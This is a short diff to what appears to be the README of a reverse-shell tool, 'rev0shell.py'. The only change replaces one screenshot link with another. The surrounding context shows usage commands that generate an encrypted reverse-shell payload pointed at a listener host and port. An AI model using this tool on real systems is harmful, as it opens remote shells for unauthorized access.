@@ -92,8 +92,7 @@ python rev0shell.py --lhost 192.168.1.6 --lport 4444 --generate --output custom.
 # Custom encryption key
 python rev0shell.py --lhost 192.168.1.6 --lport 4444 --key MySecretKey123
 
-<img width="800" height="450" alt="Image" src="https://github.com/user-attachments/assets/57ced2a4-4a09-443c-a2ed-04b5356d2de9" />
-
+<img width="800" height="450" alt="Image" src="https://github.com/user-attachments/assets/df769b9e-289f-4ec0-9885-7df4d94d501c" />
 --------------------------------------------------
 
 Command Reference
